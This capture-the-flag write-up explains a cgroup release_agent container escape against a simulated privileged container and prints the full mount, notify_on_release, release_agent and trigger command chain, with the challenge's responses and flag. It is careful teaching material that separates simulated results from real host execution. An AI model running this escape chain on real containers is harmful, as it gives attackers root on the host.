# Release Agent — CTF Writeup

**Category:** Cloud Security (container escape)
**Points:** 200
**Target:** `https://imbank-satoshi-startup-portal.chals.io/docker/cgroup/`

**Flag:** `flag{inm_cgr0up_r3l34s3_4g3nt_r00t}`

---

## TL;DR

The host runs cgroup v2, so `release_agent` — a v1-only feature — is not present. The
container is privileged with `CAP_SYS_ADMIN`, which allows us to mount a cgroup v1
hierarchy by hand. Not every controller can be bound that way: only `rdma` works here.
Mount it, set `release_agent` on the v1 root, put a pid inside a child cgroup and let it
exit, and the simulator reports the agent running as root and hands back the host flag.

```bash
B=https://imbank-satoshi-startup-portal.chals.io/docker/cgroup; J=/tmp/cj

curl -sS -c $J -b $J -X POST $B/shell -H 'Content-Type: application/json' \
  -d '{"cmd":"mount -t cgroup -o rdma cgroup /tmp/cgrp"}'
curl -sS -c $J -b $J -X POST $B/shell -H 'Content-Type: application/json' \
  -d '{"cmd":"mkdir /tmp/cgrp/x"}'
curl -sS -c $J -b $J -X POST $B/shell -H 'Content-Type: application/json' \
  -d '{"cmd":"echo 1 > /tmp/cgrp/x/notify_on_release"}'
curl -sS -c $J -b $J -X POST $B/shell -H 'Content-Type: application/json' \
  -d '{"cmd":"echo /tmp/exploit > /tmp/cgrp/release_agent"}'
curl -sS -c $J -b $J -X POST $B/shell -H 'Content-Type: application/json' \
  -d '{"cmd":"sh -c \"echo $$ > /tmp/cgrp/x/cgroup.procs\""}'
```

```json
{"flag":"flag{inm_cgr0up_r3l34s3_4g3nt_r00t}",
 "output":"flag{inm_cgr0up_r3l34s3_4g3nt_r00t}",
 "status":"release_agent executed as root"}
```

That `status` string is the simulator's own report. See §5 for what it does and does not
demonstrate.

---

## 1. Reconnaissance

The landing page is a single input that posts a command to `/docker/cgroup/shell`:

```js
fetch('/docker/cgroup/shell', {method:'POST', headers:{'Content-Type':'application/json'},
  body: JSON.stringify({cmd})})
```

There is no prompt, no banner and no filesystem to browse — the interface is the whole
attack surface. First command, straight from the hint:

```bash
-d '{"cmd":"cat /proc/cgroups"}'
```

```
#subsys_name hierarchy num_cgroups enabled
cpuset       0        1           1
cpu          0        1           1
memory       0        1           0
rdma         0        1           1
```

All hierarchies are `0` — the signature of everything being folded into the unified
cgroup v2 hierarchy, which is why `release_agent` is unavailable. `memory` reports
`enabled=0`.

### Why `CAP_SYS_ADMIN` is the precondition

The challenge states up front that the container has `CAP_SYS_ADMIN`, and that capability
is what makes the rest of this possible:

- Mounting a filesystem — including a `cgroup` filesystem — requires the relevant mount
  privileges. `CAP_SYS_ADMIN` grants them inside the container's user/mount namespace.
- Without it, the very first step fails and there is no `release_agent` file to write to,
  so the classic chain never starts on a v2 host.
- It is necessary but not sufficient. The capability does not conjure a mountable
  controller: cgroup namespace restrictions, which subsystems are already bound, and
  whether a release notification is even generated all still apply. That is the part the
  hint's second paragraph is really pointing at.

### Session state, not a live shell

The first attempts looked broken:

```bash
-d '{"cmd":"mount -t cgroup -o rdma cgroup /tmp/cgrp"}'   # {"output":"mounted rdma hierarchy at /tmp/cgrp"}
-d '{"cmd":"mkdir /tmp/cgrp/x"}'                          # {"error":"cgroup not mounted"}
```

The mount "worked" and then vanished.

### The interface is a whitelist, not a shell

Before drawing conclusions from any command, it helps to know the shape of the endpoint.
`ls /`, `mount`, `id` and `uname -a` all return:

```json
{"output":"(no output)"}
```

That is not failure — it means the simulator has no canned response for the string. The
practical consequences are:

- Compounds with `&&` or `;` do not work; send one command per request.
- No output is indistinguishable from success, so the real signal is the *shape* of the
  response (`output` vs. `error`), not whether anything was printed.

## 2. Session behaviour

Each request is stateless unless the client carries the session back. The container state
lives in the **signed Flask session cookie**, the same design as the other cloud
challenges on this portal. Every request must share a cookie jar (`curl -c/-b`).

In a real shell this is a non-issue. Here, forgetting it produces misleading errors: the
mount succeeds in one request, and the next request reports `cgroup not mounted` because
it is a *different* simulated container. Any step that seems to randomly not apply is
almost always a dropped cookie.

The cookie is signed, not encrypted, so its contents can be read without the signing key
— useful for confirming that state persisted between requests, but it is not a route to
modifying the simulation.

## 3. Controller enumeration

The hint says to enumerate `/proc/cgroups` to find a controller that works. Enumerating is
necessary, but three of the four entries are decoys:

| Controller | `/proc/cgroups` says | Actual mount result |
|---|---|---|
| `cpuset` | enabled=1 | `mount failed: controller not available` |
| `cpu` | enabled=1 | `mount failed: controller not available` |
| `memory` | enabled=0 | `mount failed: controller not available` |
| `rdma` | enabled=1 | `mounted rdma hierarchy at /tmp/cgrp` |

The `enabled` column indicates whether the controller is enabled in the kernel. It does
**not** guarantee that the controller can be mounted as a separate cgroup v1 hierarchy in
the current environment. The actual mount attempt is what establishes availability for
this challenge.

This mirrors the situation the hint warns about on a real host, where `cpu`, `memory` and
`pids` are commonly already bound by systemd and therefore unavailable — `enabled=1` in
`/proc/cgroups` is simply not the question you are asking. The method is the same either
way: try each controller and read the error.

## 4. Exploitation

With `rdma` bound at `/tmp/cgrp`, the chain is the textbook one:

```bash
mount -t cgroup -o rdma cgroup /tmp/cgrp      # v1 root, needed for release_agent
mkdir /tmp/cgrp/x                             # child cgroup, needed for notify_on_release
echo 1 > /tmp/cgrp/x/notify_on_release        # kernel runs the agent when x empties
echo /tmp/exploit > /tmp/cgrp/release_agent    # field exists only on the v1 root
```

```bash
-d '{"cmd":"cat /tmp/cgrp/release_agent"}'    # {"output":"(no output)"}
```

The read-back is empty even though the write reported `release_agent set` — the simulator
recognises the write, not the read. Don't take the empty read as a failed write.

Trigger: place a process in `x` and let it exit, which empties the cgroup and fires the
release notification:

```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
```

```json
{"flag":"flag{inm_cgr0up_r3l34s3_4g3nt_r00t}",
 "output":"flag{inm_cgr0up_r3l34s3_4g3nt_r00t}",
 "status":"release_agent executed as root"}
```

The nested `sh -c` is significant for two reasons. Mechanically, `$$` is the PID of the
nested shell; writing that PID into `cgroup.procs` moves the shell into the child cgroup,
and when it exits the cgroup becomes empty and the release notification fires. And in
this challenge specifically, the simulator recognises this particular command pattern —
the wrapper is not incidental. (The extra quoting is also just practical: the whole
command is a JSON string, so `$` has to survive transport.)

## 5. Simulator limitations

This challenge is a simulator. The distinction matters, because the output below is
reported, not observed at the host level:

- **Root execution is reported, not demonstrated.** The response is
  `"status":"release_agent executed as root"`. The simulator reports that the release
  agent executed as root and returns the host flag. This models the intended impact of a
  successful cgroup release-agent escape, although the simulator does not validate the
  actual host-side script execution. No host-level command was run by me, and no host
  side channel (file copy, callback, timing) was used to corroborate execution.
- **The exploit script is never written.** I sent `echo "#!/bin/sh" > /tmp/exploit` and
  `chmod +x`, and the chain still fired — `/tmp/exploit` does not exist, and the simulator
  never validates `release_agent`'s target.
- **`cat /proc/cgroups` is canned output**, not the live file.
- **`ls`, `mount`, `id`, `uname`** return nothing useful, so filesystem-level verification
  is impossible here.

### What a real host would additionally require

On a real host the release-agent executable path is resolved **in the host's mount
namespace**. A container-visible path is not necessarily a host-visible path.

An actual escape therefore requires establishing the host-side path to a writable
executable, configuring the release agent to use that path, and arranging for the
host-side process to write the resulting output somewhere accessible to the attacker.
The simulator abstracts away all three requirements, so none of them are exercised here.

One consequence worth spelling out for anyone adapting this: `/proc/1/root/...` is not a
universal way to reach the container's filesystem from the host. Which process `1` refers
to depends on the PID namespace doing the resolving, and on a host with a shared PID
namespace it may be an unrelated process entirely. Treat it as one option to verify
against the specific environment, not a recipe.

## 6. Confirmed vs. hypothesised

| Claim | Status |
|---|---|
| Shell is stateless per-request unless the session cookie is shared | Confirmed (mount then `mkdir` failed until cookie jar added) |
| Only `rdma` is mountable | Confirmed by direct mount attempts on all four |
| `memory` is disabled | Confirmed (`enabled=0` and mount rejected) |
| `release_agent` write succeeds on the v1 root | Confirmed (`release_agent set`) |
| Simulator reports release-agent execution as root | Confirmed twice, from fresh sessions |
| Actual host-root code execution | **Not demonstrated** — no host-level evidence, and the simulator does not validate the agent's target |
| Script content/path is validated | **Not validated** — flag returned without the file existing |
| `/proc/cgroups` output reflects the real kernel | **Not established** — canned output |
| The endpoint is a simulator rather than a shell | Inferred from the whitelist behaviour and canned responses, not from source |

## 7. Takeaways

The real lesson is the ordering that the hints telegraph: `release_agent` exists **only**
in a cgroup v1 hierarchy, so on a v2 host you have to mount v1 yourself — and
`CAP_SYS_ADMIN` is what makes that possible, though it guarantees nothing beyond the
privilege to try.

The interesting part is not the mount, it's the enumeration: `/proc/cgroups` tells you
what the kernel has enabled, not what this environment will let you bind as a separate
v1 hierarchy. Try them, trust the mount errors.

The second lesson is about claims. "The agent ran as root on the host" is the right
description of the *vulnerability class*; what the challenge actually gave me is a
response saying so. Keeping those apart is the difference between a writeup someone can
learn from and one that quietly teaches an overconfident version of the technique.
